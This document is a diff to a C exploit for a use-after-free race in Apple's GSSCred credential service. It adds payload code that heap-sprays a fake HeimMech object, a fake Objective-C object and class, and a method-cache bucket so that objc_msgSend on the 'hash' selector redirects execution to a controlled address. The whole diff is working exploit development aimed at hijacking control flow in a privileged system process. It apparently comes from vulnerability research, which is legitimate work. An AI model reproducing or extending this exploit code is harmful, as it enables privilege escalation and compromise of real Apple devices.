@@ -452,6 +452,7 @@
 #include <assert.h>
 #include <CoreFoundation/CoreFoundation.h>
 #include <mach/mach.h>
+#include <objc/objc.h>
 #include <stdbool.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -568,18 +569,32 @@ static const size_t   MAX_TRIES = 300;
 
 // ---- Parameters for building the controlled page -----------------------------------------------
 
+// These parameters were largely determined through trial and error. We want to send enough data to
+// the target process that DATA_ADDRESS is mapped with controlled contents.
 static const size_t    DATA_SIZE                = 0x4000;
 static const size_t    DATA_COUNT_PER_BLOCK     = 0x10;
 static const size_t    DATA_BLOCKS_PER_MAPPING  = 0x100;
 static const size_t    DATA_MAPPING_COUNT       = 10;
 static const uintptr_t DATA_ADDRESS             = 0x0000000120204000;
 
-static const size_t    DATA_OFFSET__HeimMech_object = 0x20;
+// These are the offsets of the various objects in our controlled data. The full structures of
+// these objects overlap so as to pack them at the front of the page, leaving the rest of the
+// contents available for JOP use.
+static const ssize_t DATA_OFFSET__HeimMech = 0x0010;	// 10 - 18  ->  20 - 28
+static const ssize_t DATA_OFFSET__name     = 0x0028;	//  0 -  8  ->  28 - 30
+static const ssize_t DATA_OFFSET__class    = 0x0000;	// 10 - 1c  ->  10 - 1c
+static const ssize_t DATA_OFFSET__bucket   = 0x0000;	//  0 - 10  ->   0 - 10
 
 // ---- Structure offsets -------------------------------------------------------------------------
 
 static const size_t OFFSET__CFString__characters = 0x11;
 static const size_t OFFSET__HeimCred__mech       = 0x20;
+static const size_t OFFSET__HeimMech__name       = 0x10;
+static const size_t OFFSET__objc_object__isa     = 0;
+static const size_t OFFSET__objc_class__buckets  = 0x10;
+static const size_t OFFSET__objc_class__mask     = 0x18;
+static const size_t OFFSET__bucket_t__key        = 0;
+static const size_t OFFSET__bucket_t__imp        = 8;
 
 // ---- Exploit implementation --------------------------------------------------------------------
 
@@ -605,24 +620,58 @@ struct gsscred_race_state {
 };
 
 // Generate the string that will be repeatedly deserialized and allocated by GSSCred. If all goes
-// according to plan, the HeimCred object will be freed and then reallocated as an OS_xpc_string,
-// and the OS_xpc_string's string data pointer overlaps perfectly with the HeimCred's "mech"
-// pointer. Thus, after we've corrupted the HeimCred, its "mech" field will be a pointer to this
-// string data. We want this fake HeimMech object's "name" field to point to our controlled data at
-// DATA_ADDRESS.
+// according to plan, the HeimCred object will be freed and then reallocated as a CFString, and the
+// CFString's inline characters will overlap with the HeimCred's "mech" pointer. Thus, after we've
+// corrupted the HeimCred, its "mech" field will point to the heap-sprayed data.
 static void
 gsscred_race_generate_uaf_string(char *uaf_string) {
 	memset(uaf_string, 'A', UAF_STRING_SIZE);
 	uint8_t *fake_HeimCred = (uint8_t *)uaf_string - OFFSET__CFString__characters;
 	uint8_t *HeimCred_mech = fake_HeimCred + OFFSET__HeimCred__mech;
-	*(uint64_t *)HeimCred_mech = DATA_ADDRESS + DATA_OFFSET__HeimMech_object;
+	*(uint64_t *)HeimCred_mech = DATA_ADDRESS + DATA_OFFSET__HeimMech;
 }
 
-// TODO
+// Generate the payload that will be sprayed in the address space of the target process and
+// hopefully be mapped at DATA_ADDRESS. GSSCred will pass the name pointer in the fake HeimMech to
+// CFDictionaryGetValue(), which will cause objc_msgSend() to be called on the fake name object
+// with the "hash" selector.
 static void
-gsscred_race_generate_spray_data(uint8_t *data) {
-	// TODO
-	memset(data, 0x51, DATA_SIZE);
+gsscred_race_generate_payload(uint8_t *payload) {
+	// Fill unused space with a distinctive byte pattern.
+	memset(payload, 0x51, DATA_SIZE);
+
+	// Get pointers to each region of the local buffer.
+	uint8_t *payload_HeimMech = payload + DATA_OFFSET__HeimMech;
+	uint8_t *payload_name     = payload + DATA_OFFSET__name;
+	uint8_t *payload_class    = payload + DATA_OFFSET__class;
+	uint8_t *payload_bucket   = payload + DATA_OFFSET__bucket;
+
+	// Get the addresses of each region in the target process.
+	uint64_t address_name     = DATA_ADDRESS + DATA_OFFSET__name;
+	uint64_t address_class    = DATA_ADDRESS + DATA_OFFSET__class;
+	uint64_t address_bucket   = DATA_ADDRESS + DATA_OFFSET__bucket;
+
+	// Construct the HeimMech object. We only care about the "name" field, which is usually a
+	// pointer to a CFString.
+	*(uint64_t *)(payload_HeimMech + OFFSET__HeimMech__name) = address_name;
+
+	// Construct the name object. We only care about the "isa" field, which is a pointer to the
+	// objc_class for this instance.
+	*(uint64_t *)(payload_name + OFFSET__objc_object__isa) = address_class;
+
+	// Construct the Objective-C class object. Since the fake name object will have the "hash"
+	// method called, we want the fake class object to have a cache hit for the "hash"
+	// selector. We ensure that objc_msgSend() always starts at the first bucket by setting
+	// "mask" to 0.
+	*(uint64_t *)(payload_class + OFFSET__objc_class__buckets) = address_bucket;
+	*(uint32_t *)(payload_class + OFFSET__objc_class__mask)    = 0;
+
+	// Construct the bucket_t that has a hit for the "hash" selector. Since the shared cache is
+	// mapped at the same address in all processes, the "hash" selector will reside at the same
+	// address in GSSCred as it does in our process.
+	uint64_t sel_hash = (uint64_t) sel_registerName("hash");
+	*(uint64_t *)(payload_bucket + OFFSET__bucket_t__key) = sel_hash;
+	*(uint64_t *)(payload_bucket + OFFSET__bucket_t__imp) = 0x0011223344556677;
 }
 
 // Generate a large mapping consisting of many copies of the given data. Note that changes to the
@@ -686,7 +735,7 @@ gsscred_race_build_spray_data_object() {
 	size_t block_size = DATA_SIZE * DATA_COUNT_PER_BLOCK;
 	uint8_t *data_block = malloc(block_size);
 	assert(data_block != NULL);
-	gsscred_race_generate_spray_data(data_block);
+	gsscred_race_generate_payload(data_block);
 	// Repeat the data several times to create a bigger block of data. This helps with the
 	// remapping process.
 	for (size_t i = 1; i < DATA_COUNT_PER_BLOCK; i++) {
